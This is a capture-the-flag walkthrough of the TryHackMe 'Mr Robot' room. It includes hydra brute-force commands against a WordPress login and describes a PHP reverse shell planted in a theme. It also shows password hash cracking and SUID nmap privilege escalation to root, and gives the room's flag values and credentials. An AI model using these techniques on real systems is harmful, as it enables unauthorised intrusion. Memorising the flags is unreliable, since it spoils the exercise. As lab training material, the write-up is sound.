# Mr Robot CTF
https://tryhackme.com/room/mrrobot

## Enumeration
22: SSH
80: Apache httpd (web server)
443: Apache httpd (web server)

## Flag 1
http://<ip>:80/robots

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**http://<ip>:80/key-1-of-3.txt**
> 073403c8a58a1f80d943455fb30724b9

## Flag 2

**http://<ip>:80/fsociety.dic**
> Dictionary of words (probably a wordlist)

Found WP-Login using Gobuster
http://<ip>/wp-login.php

Capture the post request in BurpSuite, this will give us the paramaters that we need to bruteforce credentials.

I then took that into hydra using the parameters from the login along with a failure statement F=<string>

`hydra -L fsocity.dic -p test 10.10.180.168 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.180.168%2Fwp-admin%2F&testcookie=1:F=Invalid username"`

This will bruteforce usernames & passwords and return responses that don't contain "Invalid username"

Found: 
> [80][http-post-form] host: 10.10.180.168   login: elliot   password: test

Now the password won't be correct, however we now have a username. Elliot.

I will now bruteforce the password for this user also using hydra, except it will check for a 302 status code to indicate a successful password.

`hydra -l elliot -P fsocity.dic 10.10.180.168 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.180.168%2Fwp-admin%2F&testcookie=1:S=302"`

We then find the password: "ER28-0652"

After logging in I attempt to get a reverse shell by modifying the code within the WP Theme to include some malicious PHP code. I recieved this shell using netcat.

I check the /home/ directory and find a user called robot so I check this user's home directory and I can see two files

```
4.0K -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
4.0K -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

I can't view the key-2-of-3.txt file due to the permissions, so I need to use the "robot" user.
I can however view the password.raw-md5 file which contains the following text.

robot:c3fcd3d76192e4007dfb496cca67e13b

Cracked using John shows the password: abcdefghijklmnopqrstuvwxyz

I then view the key-2-of-3.txt file to get the next flag.
> 822c73956184f694993bede3eb39f959

## Flag 3

I check for SUID bits using `find / -user root -perm -4000 -print 2>/dev/null` and find an nmap binary with a SUID bit set which is exploitable by using `<path to nmap binary> --interactive` then running `!sh` I can escape the binary with the permissions still intact from root.

I then used the layout of the other files and searched for "key-3-of-3.txt" using `find / -name "key-3-of-3.txt"`

This file contained the last flag:
> 04787ddef27c3dee1ee161b21670b4e4
